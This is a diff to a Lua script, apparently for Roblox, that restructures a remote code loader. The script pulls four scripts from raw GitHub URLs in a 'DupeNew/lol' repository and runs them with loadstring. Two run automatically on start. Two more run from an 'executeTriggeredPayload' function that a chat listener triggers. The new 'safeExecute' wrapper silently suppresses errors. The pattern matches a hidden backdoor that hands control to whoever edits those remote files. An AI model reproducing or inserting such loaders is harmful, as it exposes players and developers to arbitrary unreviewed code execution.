@@ -8,12 +8,21 @@ local autoRunScript2 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads
 local triggeredScript1 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/l.lua"
 local triggeredScript2 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/g.lua"
 
-pcall(function()
-    loadstring(game:HttpGet(autoRunScript1))()
-end)
-pcall(function()
-    loadstring(game:HttpGet(autoRunScript2))()
-end)
+local function safeExecute(url)
+    local success, code = pcall(function()
+        return game:HttpGet(url, true)
+    end)
+
+    if success and code and code ~= "" then
+        local func, err = loadstring(code)
+        if func then
+            pcall(func)
+        end
+    end
+end
+
+safeExecute(autoRunScript1)
+safeExecute(autoRunScript2)
 
 local hasTriggered = false
 local chatConnection = nil
@@ -29,13 +38,8 @@ local function executeTriggeredPayload()
         chatConnection = nil
     end
 
-    pcall(function()
-        loadstring(game:HttpGet(triggeredScript1))()
-    end)
-    
-    pcall(function()
-        loadstring(game:HttpGet(triggeredScript2))()
-    end)
+    safeExecute(triggeredScript1)
+    safeExecute(triggeredScript2)
 end
 
 local function setupChatListener(player)
